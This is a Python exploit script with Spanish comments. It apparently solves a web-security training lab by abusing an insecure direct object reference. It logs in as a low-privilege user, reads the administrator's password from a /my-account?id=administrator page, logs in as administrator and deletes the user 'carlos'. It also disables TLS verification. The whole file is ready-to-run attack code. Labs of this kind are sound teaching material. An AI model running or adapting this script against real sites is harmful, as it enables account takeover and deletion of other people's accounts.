import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def main():
    if len(sys.argv) !=2:
        print(f"Uso: {sys.argv[0]} <url>")
        print(f"Ejemplo: {sys.argv[0]} www.ejemplo.com")
        exit(-1)
    
    session = requests.session()
    base_url = sys.argv[1]
    if login_session(session,base_url,"wiener","peter"):
        admin_password = extract_admin_password(session,base_url)
        if admin_password:
            login_admin = login_session(session,base_url,"administrator",admin_password)
            if login_admin:
                delete_user_carlos(session,base_url)
            
def get_csrf_token(session,login_url,username):
    response = session.get(login_url,verify=False,proxies=proxies_setting)
    soup = BeautifulSoup(response.text,'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    print(f"(+) Token para el usuario {username} encontrado: {csrf}")
    return csrf

def login_session(session,base_url,username,password):
    login_url = f"{base_url}/login"
    csrf_token = get_csrf_token(session,login_url,username)
    credential = {
        'csrf': csrf_token,
        'username': username,
        'password': password
    }
    response = session.post(login_url,credential,verify=False,proxies=proxies_setting)
    if username in response.text:
        print(f"(+) Login user {username}")
        return True
    else:
        print(f"(-) Login fallido con user {username}")
        return False

def extract_admin_password(session,base_url):
    url_id = f"{base_url}/my-account?id=administrator"
    response = session.get(url_id,verify=False,proxies=proxies_setting)
    if "administrator" in response.text:
        print("(+) Login user administrator")
        
        """Extraigo la contraseña del adminostrador"""
        match = re.findall(r"password value='([^']+)",response.text)
        password = match[0]
        print(f"la contraseña del administrador es: {password}")
        return password
        
    else:
        print("(-) Login fallido user administrator")

def delete_user_carlos(session,base_url):
    url_admin_panel = f"{base_url}/admin/delete?username=carlos"
    response = session.get(url_admin_panel,verify=False,proxies=proxies_setting)
    if not "carlos" in response.text:
        print("(+) Usuario carlos eliminado")
    else:
        print("(-) no fue posible elimiar el usuario carlos")


if __name__ == "__main__":
    main()   